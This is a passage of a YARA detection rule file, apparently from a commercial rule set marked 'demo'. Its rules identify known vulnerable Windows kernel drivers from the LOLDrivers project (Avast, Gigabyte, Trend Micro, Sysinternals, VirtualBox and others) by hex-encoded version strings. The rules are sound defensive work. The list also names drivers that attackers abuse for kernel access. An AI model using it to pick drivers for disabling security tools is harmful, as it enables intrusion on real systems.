mentioned in LOLDrivers project using VersionInfo values from the PE header - aswArPot.sys, avgArPot.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:54:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0041007600610073007400200061006e0074006900200072006f006f0074006b00690074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041005600410053005400200053006f006600740077006100720065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310038002e0032002e0033003800320030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310038002e0032002e0033003800320030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0041007600610073007400200041006e00740069007600690072007500730020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028006300290020003200300031003800200041005600410053005400200053006f006600740077006100720065 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Avastsoftware_Aswvmmsys_Avastantivirus_3650_RID3DD8 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - aswVmm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:11:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00610076006100730074002100200056004d0020004d006f006e00690074006f0072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041005600410053005400200053006f006600740077006100720065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0038002e0030002e0031003400390037002e003300370036 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0038002e0030002e0031003400390037002e003300370036 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0061007300770056006d006d002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00610076006100730074002100200041006e0074006900760069007200750073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0061007300770056006d006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028006300290020003200300031003300200041005600410053005400200053006f006600740077006100720065 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Gigabytetechnologycoltd_Gdrvsys_Gdrv_FF67_RID3CDE : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - gdrv.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:30:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0047004900470041002d00420059005400450020004e006f006e0050004e00500020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0047004900470041002d004200590054004500200054004500430048004e004f004c004f0047005900200043004f002e002c0020004c00540044002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0030002e0031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310037003100320030003100300031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0067006400720076002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]006700640072007600360034 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0067006400720076002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310037 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Sysinternalswwwsysinternalscom_Procexpsys_Processexplorer_4408_RID4624 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - procexp.Sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 04:05:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00500072006f00630065007300730020004500780070006c006f007200650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0053007900730069006e007400650072006e0061006c00730020002d0020007700770077002e0073007900730069006e007400650072006e0061006c0073002e0063006f006d } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310036002e00340033 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310036002e00340033 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00700072006f0063006500780070002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00500072006f00630065007300730020004500780070006c006f007200650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00700072006f0063006500780070002e005300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028004300290020004d00610072006b002000520075007300730069006e006f007600690063006800200031003900390036002d0032003000320031 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Rivetnetworksllc_Kfecodrvsys_Killertrafficcontrol_B583_RID425C : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - KfeCo10X64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 01:24:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004b0069006c006c006500720020005400720061006600660069006300200043006f006e00740072006f006c002000430061006c006c006f007500740020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005200690076006500740020004e006500740077006f0072006b0073002c0020004c004c0043002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0039002e0037002e0034002e00310031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0039002e0037002e0034002e00310031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004b006600650043006f004400720076002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004b0069006c006c006500720020005400720061006600660069006300200043006f006e00740072006f006c } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004b006600650043006f004400720076002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310035002d00320030003100380020005200690076006500740020004e006500740077006f0072006b0073002c0020004c004c0043002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Nvidiacorp_Nvoclocksys_Nvidiasystemutilitydriver_3D00_RID4206 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - nvoclock.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 01:10:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e00560069006400690061002000530079007300740065006d0020005500740069006c0069007400790020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004e0056006900640069006100200043006f00720070002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0035002e00300035002e00320035 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0035002e00300035002e00320035 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006e0076006f0063006c006f0063006b002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e00560069006400690061002000530079007300740065006d0020005500740069006c0069007400790020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006e0076006f0063006c006f0063006b002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a9004e0056004900440049004100200043006f00720070002e00200032003000300033002d0032003000300034 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Trendmicroinc_Tmcommsys_Trendmicroaegis_ED2F_RID3E20 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - TmComm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:23:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005400720065006e0064004d006900630072006f00200043006f006d006d006f006e0020004d006f00640075006c0065 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e00380030002e0030002e0031003000360033 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e00380030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f002000410045004700490053 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300035002d00320030003000390020005400720065006e00640020004d006900630072006f00200049006e0063006f00720070006f00720061007400650064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Msi_Ntiolibxsys_Ntiolib_09BE_RID3774 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - NTIOLib.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 17:39:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e00540049004f004c00690062 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004d00530049 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0030002e0032 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0030002e0032 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004e00540049004f004c00690062005f005800360034002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e00540049004f004c00690062 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004e00540049004f004c00690062005f005800360034002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003100360020004d006900630072006f002d005300740061007200200049004e00540027004c00200043004f002e002c0020004c00540044002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Trendmicroinc_Tmcommsys_Aegis_A802_RID39C3 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - TmComm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 19:17:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005400720065006e0064004d006900630072006f00200043006f006d006d006f006e0020004d006f00640075006c0065 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e0035002e0030002e0031003100320031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e0035 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00410045004700490053 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300035002d00320030003000380020005400720065006e00640020004d006900630072006f00200049006e0063006f00720070006f00720061007400650064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Avgtechnologiesczsro_Aswarpotsys_Avginternetsecuritysystem_0F01_RID4660 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - aswArPot.sys, avgArPot.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 04:15:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00410056004700200061006e0074006900200072006f006f0074006b00690074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00410056004700200054006500630068006e006f006c006f006700690065007300200043005a002c00200073002e0072002e006f002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310038002e0038002e0034003000350037002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310038002e0038002e0034003000350037002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00410056004700200049006e007400650072006e00650074002000530065006300750072006900740079002000530079007300740065006d0020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310038002000410056004700200054006500630068006e006f006c006f006700690065007300200043005a002c00200073002e0072002e006f002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Sunmicrosystemsinc_Vboxdrvsys_Sunvirtualbox_R_7539_RID40DD : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - VBoxDrv.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 00:20:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005600690072007400750061006c0042006f007800200053007500700070006f007200740020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00530075006e0020004d006900630072006f00730079007300740065006d0073002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0033002e0030002e0030002e007200340039003300310035 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0033002e0030002e0030002e007200340039003300310035 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00560042006f0078004400720076002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00530075006e0020005600690072007400750061006c0042006f0078 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00560042006f0078004400720076002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300039002000530075006e0020004d006900630072006f00730079007300740065006d0073002c00200049006e0063002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Interfacecorporation_Cpxcsys_Gpcxc_1183_RID3BD2 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - CP2X72C.SYS\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:45:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004700500043002d003200580037003200430020004b00650072006e0065006c0020004400650076006900630065002000440072006900760065007200280053005900530029002000570069006e0064006f00770073004e0054 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0049006e007400650072006600610063006500200043006f00720070006f0072006100740069006f006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e00360031002d00320030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e00360031002d00320030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0043005000320058003700320043002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004700500043002d00320058003700320043 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0043005000320058003700320043 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200032003000300031002c0020003200300030003700200049006e007400650072006600610063006500200043006f00720070002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Trendmicroinc_Tmcommsys_Trendmicroeyes_478D_RID3DB3 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - TmComm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:05:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005400720065006e0064004d006900630072006f00200043006f006d006d006f006e0020004d006f00640075006c0065 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e00360030002e0030002e0031003000380032 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e00360030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200045007900650073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000200028004300290020002000320030003100390020005400720065006e00640020004d006900630072006f00200049006e0063006f00720070006f00720061007400650064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them\n}\n\nrule PUA_VULN_Driver_Trendmicroinc_Tmcommsys_Activeclean_A903_RID3C3B : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - TmComm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:03:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005400720065006e0064004d006900630072006f00200043006f006d006d006f006e0020004d006f00640075006c0065 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0036002e0030002e0031003000350032 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0036 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0041006300740069007600650043006c00650061006e } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300035002d00320030003000370020005400720065006e00640020004d006900630072006f00200049006e0063006f00720070006f00720061007400650064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Sysinternalswwwsysinternalscom_Procexpsys_Processexplorer_3FF3_RID4646 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - procexp.Sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 04:11:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00500072006f00630065007300730020004500780070006c006f007200650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0053007900730069006e007400650072006e0061006c00730020002d0020007700770077002e0073007900730069006e007400650072006e0061006c0073002e0063006f006d } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310031002e00340030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310031002e00340030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00700072006f0063006500780070002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00500072006f00630065007300730020004500780070006c006f007200650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00700072006f0063006500780070002e005300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028004300290020004d002e002000520075007300730069006e006f007600690063006800200031003900390036002d0032003000310030 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Realixtm_Hwinfosys_Hwinfokerneldriver_1B17_RID3D45 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - HWiNFO32.SYS\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:47:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004800570069004e0046004f003300320020004b00650072006e0065006c0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005200450041004c0069005800280074006d0029 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0037002e003300300020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0037002e00330030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004800570069004e0046004f00330032002e005300590053 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004800570069004e0046004f003300320020004b00650072006e0065006c0020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004800570069004e0046004f00330032002e005300590053 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028006300290031003900390039002d00320030003100300020004d0061007200740069006e0020004d0061006c00ed006b0020002d0020005200450041004c00690058 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Novellinc_Novellxtier_6CF1_RID36B9 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - libnicm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 17:08:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e006f00760065006c006c0020005800540043004f004d0020005300650072007600690063006500730020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004e006f00760065006c006c002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0033002e0031002e0036002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0033002e0031002e0036 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e006f00760065006c006c002000580054006900650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006c00690062006e00690063006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00280043002900200043006f007000790072006900670068007400200032003000300030002d0032003000310030002c0020004e006f00760065006c006c002c00200049006e0063002e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Tenasyscorporation_Rtifsys_Intime_EAE5_RID3BD3 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - rtif.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:45:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0049004e00740069006d006500200050006e00500020005200540020004b00650072006e0065006c00200049006e00740065007200660061006300650020004400720069007600650072 } \n      $ = { 